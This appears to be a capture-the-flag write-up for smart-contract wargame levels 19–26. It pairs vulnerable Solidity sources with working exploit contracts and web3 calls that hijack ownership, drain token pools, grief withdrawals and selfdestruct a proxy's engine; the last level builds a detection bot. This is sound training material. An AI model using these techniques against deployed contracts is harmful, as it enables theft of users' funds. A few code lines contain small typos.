## 19 Alien Codex
We have to claim the ownership of the contract to complete this level.

#### Source:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```
Solidity stores array length in a slot and its elements in the hash of the slot, [this](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) blog explains the storage. If we continue to decrease the array length with it will become `2^256` because of integer underflow. Therefore we can index every slot of the storage. Now we just have to calculate the index of the slot 0 (which holds the owner). By using the `revise` function we can update the data at that slot. Hence we could potentially change the owner of the contract. The first element of the array will be stored at slot (keccak256 of slot where the length of the array is saved). The index of the slot0 would be slot keccak256(1) + (2\*\*256 - keccak256(1)).

> #### Solution:
> - We need to make contact first.
> ```js
> await contract.make_contract();
> ```
> - Then we have to make array length underflow by calling `retract()`.
> ```js
> await contract.retract();
> ```
> - Index of slot 0 is `2**256 - keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`
> ```js
> index = web3.utils.encodePacked(web3.utils.toBN("0x1".padEnd("67", "0")).sub(web3.utils.toBN(web3.utils.keccak256("0x000000000000000000000000000000000000000000000000000000000000001"))))
> ```
> 
> - Call the `revise` function to update the data.
> ```js
> await contract.revise(index, web3.eth.abi.encodeParameter("address", player));
> ```

<hr>

## 20 Denial
We have to become the partner, and block the owner of the contract from withdrawing the funds.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
A call is made to the partner's address, and then transfer to owner. We cannot use revert to stop the execution since call just returns the data. Here its not being validated so the output from the call doesn't change the behaviour of the further code. But here the gas limit is not specified in the call. So in order to stop the execution we could simply use all the available gas, which eventually stops the code execution due to out of gass error. 

> #### Solution
> We know that storing data in the storage is expensive, we use up all the gas by doing the same thing. 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> contract denExp {
>     uint j = 0;
>     uint g = 0;
>     fallback() external payable {
>         uint p = 10;
>         for (uint i = 11; i > p ; i++) {
>             j = j + 1;
>             g = g ** i;
>         }
>     }
> }
>  ```
 
<hr>

## 21 Shop
We need to set the price to lower from its original value.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

This challenge is similar to `Elevator` challenge, where we need to return different results. But here the call function is of `view` visibility. So we cannot use the help of a variable. But we could return different values based on the `isSold` parameter of the contract.

> #### Solution:
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface shop {
>     function isSold() external view returns(bool);
>     function buy() external;
> }
> 
> contract buyer {
>     shop s;
> 
>     constructor(address _instance) public{
>         s = shop(_instance);
>     }
> 
>     function callBuy() public {
>         s.buy();
>     }
> 
>     function price() external view returns (uint) {
>         if (s.isSold()) {
>             return 50;
>         }
>         return 101;
>     }
> }
> ```

<hr>

## 22 Dex
In this level we have to drain at least 1 of 2 tokens.

#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Here the `swap` amount is calculated incorrectly, we could drain one of the token by following a sequence of swaps.
```
TOKEN1 => TOKEN2 => TOKEN1 => TOKEN2 .......
```

> #### Solution:
> In order to swap tokens we have to first approve the contract to transfer our tokens.
> ```js
> swapTokens = async (from, to, amount) => {
>   if (!amount) amount = await contract.balanceOf(from, player);
>     await web3.eth.sendTransaction({
>         from: player,
>         to: from,
>         data: web3.eth.abi.encodeFunctionSignature("approve(address,uint256)") + instance.substring(2).padStart(64, "0") + web3.utils.encodePacked(amount).substring(2)
>     });
>     await contract.swap(from, to, amount);
> }
> ```
> 
> ```js
> await swapTokens(token1, token2);
> // [token1: player=0, contract=110] [token2: player=20, contract=90]
> 
> await swapTokens(token2 token1); 
> // [token1: player=24, contract=86] [token2: player=0, contract=110]
> 
> await swapTokens(token1, token2); 
> // [token1: player=0, contract=110] [token2: player=30, contract=80]
> 
> await swapTokens(token2, token1); 
> // [token1: player=41, contract=69] [token2: player=0, contract=110]
> 
> await swapTokens(token1, token2); 
> // [token1: player=0, contract=110] [token2: player=65, contract=45]
> 
> await swapTokens(token2, token1, 45); //since 45 tokens of token2 are remaining.
> // [token1: player=110, contract=0] [token2: player=20, contract=90]
> ```

## 23 Dex Two
In this level we need to steal all the tokens (token1, token2).

#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Here the swap tokens are not validated properly, we could set up a dummy token and make the contract believe that we hold tokens on the contract. 

> #### Solution:
> - We could swap tokens using our dummy token contract.
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> contract dexExp {
> 
>     function balanceOf(address account) external view returns (uint256){
>         return 100;
>     }
> 
>     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
>         return true;
>     }
> }
> ```
> - We could do swaps with this token address.
> ```js
> exp = "0xe30bb4f557e4aa4d669992727cb3293609a345b5"; // replace the address with your exploit contract address
> token1 = await contract.token1();
> token2 = await contract.token2();
> await contract.swap(exp, token1, 100);
> await contract.swap(exp, token2, 100);
> ```

<hr>

## 24 Puzzle Wallet
We need to become admin of the contract.

#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
This contract uses upgradable proxy pattern, so both the contracts use the same storage.

```
slot0 => pendingAdmin, owner;
slot1 => admin, maxBalance;
```
If we write data to the slots both the contracts will use the same data in the slots.

With the `proposeNewAdmin` function in the `PuzzleProxy` we can set `pendingAdmin`, and that overwrites to `owner` in the `PuzzleWallet` contract, by this means we can become the owner of `PuzzleWallet` contract.

Now we need to update the slot1, in the `PuzzleWallet` contract we can set `maxBalance` using `setMaxBalance` function, but we need to be `whitelisted` we can do that by using `addToWhitelist` function as we are  already `owner` of the `PuzzleWallet` contract. And also the instance balance must be equal to 0.

Now we have to drain the funds from the address, in the contract `PuzzleWallet` we have a function `execute` which can be used to send the funds out of the contract but first we have to deposit the funds. And we also have a function `multicall` which delegate calls to itself. We can use these function to drain the balance from the address. The `multicall` function takes a bytes array and each element in the array are used as data to delegete call to itself. 
Remember in a delegate call `msg.sender`,`msg.value` are not effected those values remain same. We will use this to deposit the funds multiple times from a single call, by which we increase our balance without sending funds to the contract, but the function checks that the deposit function selector is only passed once in the array. So we pass the function `multicall` with deposit selector as its parameter our job will be done. And finally we could use `execute` to withdraw the funds.

> #### Solution:
> - Call the `proposeNewAdmin` of the `ProxyPuzzle` contract.
> ```js
> await sendTransaction({
>     from: player,
>     to: instance,
>     data: web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)") + web3.eth.abi.encodeParameter("address", player).substring(2)
> });
> ```
> - We have to whitelist ourself.
> ```js
> await contract.addToWhitelist(player);
> ```
> 
> - We need to make the instance balance to 0.
> ```js
> var {data: deposit} = await contract.deposit.request();
> var {data: multiDeposit} = await contract.multicall.request([deposit]);
> var {data: execute} = await contract.execute.request(player, toWei("0.002"), "0x");
> arr = [deposit, multiDeposit, execute];
> await sendTransaction({
>   from: player,
>     to: instance,
>     value: toWei("0.001"),
>     data: web3.eth.abi.encodeFunctionSignature("multicall(bytes[])") + web3.eth.abi.encodeParameter("bytes[]", arr).substring(2)
> });
> ```
> - Now we can call the `setMaxBalance` to set the `maxBalance`.
> ```js
> await contract.setMaxBalance(player);
> ```

<hr>

## 25 Motorbike
We need to `selfdestruct` its engine contract.
#### Source:
```sol
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

This contract also follows a upgradable proxy pattern and it also implements [EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967) to maintain the storage slots related to proxy.

We need to `selfdestruct` the engine contract. We can call the `engine` contract through the `motorbike` contract or directly with the `engine` contract address, in order to destroy the engine we need to work with the storage of the `engine` contract, so delegate calling from `motorbike` won't help us.
We need to find the address of the `engine` contract, according to the EIP-1967 standards the address of logic contract will be stored at slot  `_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;`
Now we have the `engine` contract address.

In order to update the address at slot `_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;` we need to be the upgrader. We will use `initialize` function to become the upgrader. Hence that gives us the permission to call `upgradeToAndCall` function through we can update the implementation to our exploit contract which can `selfdestruct` the `engine`.

> #### Solution:
> - Get the address of the `engine` contract.
> ```js
> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
> // 0x0000000000000000000000008d989014e1a52e12c870613109d2bb3ee0ec56f9
> engine = "0x" + "0x0000000000000000000000008d989014e1a52e12c870613109d2bb3ee0ec56f9".substring(26);
> // 0x8d989014e1a52e12c870613109d2bb3ee0ec56f9
> ```
> 
> - Call the initialize of engine to become the upgrader.
> ```js
> await sendTransaction({
>     from: player,
>     to: engine,
>     data: web3.eth.abi.encodeFunctionSignature("initialize()")
> });
> ```
> 
> - Deploy the exploit contract and call the `upgradeToAndCall` function to update and delegate call the implementation.
> ```js
> await sendTransaction({
>     from: player,
>     to: engine,
>     data: web3.eth.abi.encodeFunctionSignature("upgradeToAndCall(address,bytes)") + web3.eth.abi.encodeParameters(["address", "bytes"], ["0x47202da4b8205cf45a9919a74d0e5b36736875fd", web3.eth.abi.encodeFunctionSignature("destruct()")]).substring(2)
> });
> ```
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> contract engine {
>     address payable own;
>     
>     constructor() public {
>         own = payable(msg.sender);
>     }
> 
>     function destruct() external {
>         selfdestruct(own);
>     }
> }
> ```

<hr>

## 26 DoubleEntryPoint
We have to figure the bug inthe `CryptoVault` and register our own `detection bot` to `raise alerts` when the bug is been exploited.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) public {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

The `CryptoVault` should only allow to sweep(transfer from vault) the tokens otherthan underlying, but the `LegacyToken` has a transfer function when checks if any delegate parameter is set, if set it will call the tranfer of the delegate address specified (this could be even the token which is marked as `underlying`) as a result the underlying tokens are transfered.

In order to prevent transfering the tokens, we have to deploy our detection bot which will check if the transfering coin is our `DoubleEntryPointToken`, If yes it will raise the alert and revert the transaction. This way we could protect the underlying token from being transfered.

#### Solution:
- We need to get the `forta` contract address.
```js
await contract.forta();
```

- Deploy our detection bot contract.
```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function raiseAlert(address user) external;
}
contract bot {
    IForta fort;
    address det;

    constructor(address _forta, address _det) {
        fort = IForta(_forta);
        det = _det;
    }

    function handleTransaction(address user, bytes calldata msgData) public {
        // 4 bytes function selector, 32 bytes _to address, 32 bytes uint _value, 32 bytes sender value
        bytes4 _sig = bytes4(msgData[:4]);
        bytes32 _to = bytes32(msgData[4:4+32]);
        bytes32 _value = bytes32(msgData[4+32:4+32+32]);
        bytes32 sender = bytes32(msgData[4+32+32:4+32+32+32]);
        if(address(uint160(uint256(sender))) == det) {
            fort.raiseAlert(user);
        }
    } 
}
```

- Register our detection bot in the `forta` contract.
```js
await sendTransaction({
    from: player,
    to: forta,
    data: web3.eth.abi.encodeFunctionSignature("setDetectionBot(address)") + web3.eth.abi.encodeParameter("address", "0x84fbaba1ae2c389bba1c107ed6faded1c2e6484b").substring(2)
});
```
- Try withdrawing the underlying token.
```js
leg = await contract.delegatedFrom();
vault = await contract.cryptoVault();
await sendTransaction({
    from: player,
    to: vault,
    data: web3.eth.abi.encodeFunctionSignature("sweepToken(IERC20)") + web3.eth.abi.encodeParameter("address", leg).substring(2)
}); //this will fail beacuse the detection bot will raise alert!!!!
```
<hr>
Thanks for reading :)
<hr>
